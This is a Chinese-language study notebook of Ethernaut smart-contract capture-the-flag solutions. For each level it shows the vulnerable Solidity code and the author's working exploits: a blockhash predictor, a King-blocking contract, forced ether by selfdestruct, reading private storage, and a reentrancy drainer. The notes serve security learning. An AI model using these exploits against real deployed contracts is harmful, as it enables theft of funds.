# 靶场笔记

## hello ethernaut

- 新手关卡：
- contract：查看合约对象
    
    contract.abi：查看合约对象
    
    contract.info():查看当前合约的info方法
    
    awit contract.info():Look into the levels’s info method
    
    ethernaut.owner()：查看合约拥有者
    
    player：查看玩家地址
    
- 

## pull

- 题目要求：
    
    you claim ownership of the contract
    
    you reduce its balance to 0
    
- 合约代码：
    
    ```
    * pragma solidity ^0.8.0;
    
      contract Fallback {
    
        mapping(address => uint) public contributions;
        address public owner;
    
        constructor() {
          owner = msg.sender;
          contributions[msg.sender] = 1000 * (1 ether);
        }
    
        modifier onlyOwner {
              require(
                  msg.sender == owner,
                  "caller is not the owner"
              );
              _;
          }
    
        function contribute() public payable {
          require(msg.value < 0.001 ether);
          contributions[msg.sender] += msg.value;
          if(contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
          }
        }
    
        function getContribution() public view returns (uint) {
          return contributions[msg.sender];
        }
    
        function withdraw() public onlyOwner {
          payable(owner).transfer(address(this).balance);
        }
    
        receive() external payable {
          require(msg.value > 0 && contributions[msg.sender] > 0);
          owner = msg.sender;
        }
    
      }
    
    *
    ```
    
    首先生成实例，在游览器控制台得到实例地址0x3eAc929a9Fd14831E218F2Da0ED3187c66BD706e
    
- 在remix中部署智能合约，在合约地址中填上实例地址
- 以太币数量填1wei，然后contribute，在metamask中确认后即满足contribute方法中msg.value<0.001eth的条件
- 在contribute中if条件当你的余额大于部署者余额时，你就成为owner。
- 在remix上执行Transact，消息调用成功后receive方法将msg.sender作为owner，此时remix上的owner地址为你的地址，完成了第一个成为部署者的任务
- 执行withdraw方法，将合约中的钱全部转移到当前账户中，完成第二个资产转移任务
- 控制台结果为：
    
    ![https://www.notion.soC:\Users\一只老风铃\Documents\Tencent%20Files\1759306440\FileRecv\chain%20sec%20labs\靶场笔记.assets\image-20230224015227336.png](https://www.notion.soC:\Users\一只老风铃\Documents\Tencent%20Files\1759306440\FileRecv\chain%20sec%20labs\靶场笔记.assets\image-20230224015227336.png)
    

## fallout

- 要求成为owner
- 合约代码：
    
    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    
    import 'openzeppelin-contracts-06/math/SafeMath.sol';
    
    contract Fallout {
    
      using SafeMath for uint256;
      mapping (address => uint) allocations;
      address payable public owner;
    
      /* constructor */
      function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
      }
    
      modifier onlyOwner {
              require(
                  msg.sender == owner,
                  "caller is not the owner"
              );
              _;
          }
    
      function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
      }
    
      function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
      }
    
      function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
      }
    
      function allocatorBalance(address allocator) public view returns (uint) {
        return allocations[allocator];
      }
    }
    ```
    
- 注意本题的关键在于fallout方法由于编写者的拼写错误导致构造函数成为了随时可以调用的公共函数
- 因此直接用这个构造函数（其实并不是，注意合约叫Fallout，但是这个函数叫Fal1out（）就可以了
- 由于在remix上SafeMath.sol的地址是错误的，故我们在控制台上直接调用：await contract.Fal1out()即可提交，contract.owner查看此时的owner是我们自己了

## coin Flip

- 区块链随机数问题
- 合约代码：
    
    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract CoinFlip {
    
      uint256 public consecutiveWins;
      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
      constructor() {
        consecutiveWins = 0;
      }
    
      function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
    
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
    
        if (side == _guess) {
          consecutiveWins++;
          return true;
        } else {
          consecutiveWins = 0;
          return false;
        }
      }
    }
    ```
    
- 生成新实例得到实例地址：0x4B396A00D471354DDd0690C65c3701223677063F
- 解题关键：
    
    uint256 blockValue = uint256(blockhash(block.number - 1));
    
    利用 block.blockhash(block.number-1) 来生成随机数，这是可预测的，我们可以部署一个恶意的新合约，先进行随机数的预测再竞猜
    
- 攻击合约代码：
    
    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    import "./CoinFlip.sol";
    
    contract Attack{
        CoinFlip private coinFlip;
        uint256 FACOTR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
        constructor(address _name){
            coinFlip = CoinFlip(_name);
        }
        function attack() external{
            bool guess = guess();
            require(coinFlip.flip(guess),"guess false");
    
        }
    
        function guess() private view returns(bool){
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue/FACOTR;
            bool side =  coinFlip == 1? true : false;
            return side;
        }
    
    }
    ```
    
- 执行合约10次即可完成10次attack（）方法，记住一个块上只能attack一次，执行完后查询consecutiveWins

## telephone

- 要求：成为owner
- 合约代码
    
    ```
    pragma solidity ^0.6.0;
    
    contract Telephone {
    
      address public owner;
    
      constructor() public {
        owner = msg.sender;
      }
    
      function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
          owner = _owner;
        }
      }
    }
    
    ```
    
- 题解关键：绕过：if (tx.origin != msg.sender)
- 使用其他合约调用changeOwner方法，即可满足tx.origin!=msg.sender,即可换掉owner
- 解体思路：新写一个合约调用Telephone中的changeOwner方法即可
- 补充ps：tx.origin和msg.sender的区别：
    
    ![https://www.notion.soC:\Users\一只老风铃\Documents\Tencent%20Files\1759306440\FileRecv\chain%20sec%20labs\靶场笔记.assets\image-20230224123026213.png](https://www.notion.soC:\Users\一只老风铃\Documents\Tencent%20Files\1759306440\FileRecv\chain%20sec%20labs\靶场笔记.assets\image-20230224123026213.png)
    
    image-20230224123026213
    
- 
    
    ![https://www.notion.soC:\Users\一只老风铃\Documents\Tencent%20Files\1759306440\FileRecv\chain%20sec%20labs\靶场笔记.assets\image-20230224123433272.png](https://www.notion.soC:\Users\一只老风铃\Documents\Tencent%20Files\1759306440\FileRecv\chain%20sec%20labs\靶场笔记.assets\image-20230224123433272.png)
    
    image-20230224123433272
    

## Token

- 合约代码：
    
    ```
    pragma solidity ^0.6.0;
    
    contract Token {
    
      mapping(address => uint) balances;
      uint public totalSupply;
    
      constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
      }
    
      function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
      }
    
      function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
      }
    }
    
    ```
    
- 题解关键：require(balances[msg.sender] - _value >= 0);
- balances[msg.sender]和value都是uint，因此他们相减的结果一定仍然是uint(可能会存在下溢出)，所以一定大于等于0
- balance[_to]+= _ value;出现下溢出从而余额变多
- 控制台直接输入await contract.transfer(“0xc6Ef69fBCEFc582E248b32fDB48f9BC685F6b1b1”,21)；

## Delegation

- 获取合约所有权
- 合约代码：
    
    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract Delegate {
    
      address public owner;
    
      constructor(address _owner) {
        owner = _owner;
      }
    
      function pwn() public {
        owner = msg.sender;
      }
    }
    
    contract Delegation {
    
      address public owner;
      Delegate delegate;
    
      constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
      }
    
      fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
          this;
        }
      }
    }
    ```
    
- 执行环境会变成调用者的环境，当前调用者是Delegation合约，因此虽然调用的是Delegate合约里的pwn函数，但是修改的并不是Delegate合约里的owner，而是Delegation合约里的owner
- 这里要用到web3.js：
    
    通过转账触发 Delegation合约的 fallback函数，同时设置 data`为 pwn 函数的标识符。
    
    ```haskell
    delegate.delegatecall(msg.data)
    ```
    
    然后在Delegate合约里面的 pwn函数就会修改 Delegation 合约的 owner 变量为我们的合约地址
    
- 在网上查到的计算id方法：
    
    ```
    web3.sha3("pwn()").slice(0,10)
    "0xdd365b8b"
    ```
    

## Force

- `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Force {/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m)
*/}`
- 要求让该合约的余额不为零：this.balance！=0
- 利用selfdestruct自毁函数：
    
    ![https://www.notion.soC:\Users\一只老风铃\Documents\Tencent%20Files\1759306440\FileRecv\chain%20sec%20labs\靶场笔记.assets\image-20230224125023296.png](https://www.notion.soC:\Users\一只老风铃\Documents\Tencent%20Files\1759306440\FileRecv\chain%20sec%20labs\靶场笔记.assets\image-20230224125023296.png)
    
    image-20230224125023296
    
- 强制转账：如果要能往合约发送 eth 需要其 fallback函数为 payable,可以使用另一个合约使用selfdestruct强行给一个合约发送eth
    
    ```
    contract Selfdestruct {
        function Selfdestruct() public payable{}
        // 构造函数为payable，那么就能在部署的时候给此合约转账。
      function attack() public {
     selfdestruct(0x00df9e19b596e9d8ab0fa7c6edfcc5f9f0654eb88e);
     // 这里要指定为销毁时将基金发送给的地址。
      }
    }
    ```
    

## Vault

- 合约代码：
    
    ```
    pragma solidity ^0.6.0;
    
    contract Vault {
      bool public locked;
      bytes32 private password;
    
      constructor(bytes32 _password) public {
        locked = true;
        password = _password;
      }
    
      function unlock(bytes32 _password) public {
        if (password == _password) {
          locked = false;
        }
      }
    }
    ```
    
- Solidity中变量的可见性问题：
    
    要求locked=false，其实就是计算出那个私有变量在storage中的位置，就直接调用Web3的api来获得那个变量值。
    
    ps：合约使用外界未知的私有变量。虽然变量是私有的，无法通过另一合约访问，但是变量储存进 storage 之后仍然是公开的。我们可以使用区块链浏览器（如 etherscan）观察 storage 变动情况，或者计算变量储存的位置并使用 Web3 的 api 获得私有变量值
    
- 在网上查到的：
    
    ```
    web3.eth.getStorageAt("0xd22f593d19cc91d53cad61670fb8474624e8e4a7", 1, function(x, y) {alert(web3.toHex(y))})
    ```
    
- 即可查看合约0xd22f593d19cc91d53cad61670fb8474624e8e4a7的第2个stroge变量的值，即password
- 在remix中把password解锁即可

## king

- 合约代码：要求成为永远的king
- `pragma solidity ^0.4.18;
import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
contract King is Ownable { address public king; uint public prize; function King() public payable { king = msg.sender; prize = msg.value; } function() external payable { require(msg.value >= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; }
}`
- 题解关键：king.transfer(msg.value); 利用转账函数transfer在转过程中报错从而无法继续执行下面king = msg.sender;的代码，就不会产生新国王了
- 获取当前国王的价格：
    
    ```
    fromWei((await contract.prize()).toNumber())
    ```
    
- 构建新合约并抛出异常让transfer函数无法继续执行：
    
    ```
    pragma solidity ^0.6.0;
    
    contract A{
        address target = 0x20b5Ff3460aE2a6C7D8fdE858CD1C6e1311445D4;
        function attack() payable public {
            target.call{value : 1 ether}("");
        }
        fallback() external payable {
            require(false);
        }
    }
    ```
    
- 网上查阅到的方法：
    
    ```
    pragma solidity ^0.4.18;
    contract KingAttack {
      function KingAttack() public payable {
        address victim = 0x00023c2d053a342b80116d1ff0b986f5d821a08d91; // instance address
        victim.call.gas(1000000).value(msg.value);
      }
    ```
    

### ****Re-entrancy****

- 源码：要求拿走合约中的所有钱

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

- 解题关键在withdraw函数，该方法要求余额大于所取走的钱数，但在if判断中是先进行call转账再进行amount余额减少，针对这个地方我们可以使call（）转账失败从而触发fallback回调函数，在回退函数中我们先给合约捐款使其有余额后，调用withdraw函数并触发fallback回调函数，但余额还未删减，就继续require直到合约中钱被去玩。
- 攻击合约：
    
    ```solidity
    contract attack{
        Reentrance re;
        address  payable owner;
        uint public balance;
        uint money;
        constructor(address payable _addr)public  {
            re = Reentrance(_addr);
            owner = msg.sender;
        }
        function donate()public payable{
            money = msg.value;
            re.donate{value:money}(address(this));
        }
        function withdraw()public{
            re.withdraw(money);
        }
        function qu()public{
            owner.transfer(address(this).balance);
        }
        fallback()external payable{
            balance = address(re).balance;
            if (balance>0){
    
            if(balance>=money){
                re.withdraw(money);
            }else{
                re.withdraw(balance);
            }
            }
        }
    }
    ```